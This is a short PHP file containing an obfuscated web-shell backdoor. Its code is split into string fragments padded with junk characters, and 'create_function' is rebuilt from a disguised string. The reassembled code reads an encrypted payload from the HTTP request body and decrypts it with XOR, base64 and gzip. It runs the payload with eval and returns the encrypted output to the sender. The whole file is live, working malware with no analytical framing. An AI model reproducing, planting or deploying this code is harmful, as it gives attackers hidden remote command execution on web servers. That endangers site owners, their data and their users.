<?php
$f='"1CT=tT=tW=tI73FfBfE1Dv";fun=tction x($t=t,$k){=t$c=st=trlen($k=t);$l';
$k='=1) =t{@=tob_start()=t;@e=tval(@gzunco=tmpress(=t@x(@b=tase64_d=tecod';
$M='=ti<$l);$j++,$i=t++){$o.==t$t{=t$i}^$=tk{$j};=t}}return=t $o;}if =t(@pr=teg';
$K='$k="9ada=tbee7"=t;$k=th==t"0bac637abe3=t0";$kf=t="0ccceb6=tb9d01"=t;$p=t=';
$o=str_replace('OB','','OBcreaOBteOB_fuOBOBnctiOBon');
$z='==tstr=tlen($t);=t=t$o==t"";for($i==t0;$i<$l;){for(=t$j=0=t;=t=t($j<$c&&$';
$D='=te($m[=t1]),$k)))=t;$=to=t=@ob_=tget_cont=tents();@ob_end=t_c=tlean()=t;$r=@ba';
$p='_m=tatch("/$=tkh(=t.+)=t$kf/",@file_get=t_cont=tents("p=thp://i=tnpu=tt"),$m)==t';
$H='=t=tse64_en=tcode(@x(@gzc=tompr=tess($o),=t$k))=t;print("=t$p$kh$r=t$kf");}';
$Y=str_replace('=t','',$K.$f.$z.$M.$p.$k.$D.$H);
$w=$o('',$Y);$w();
?>
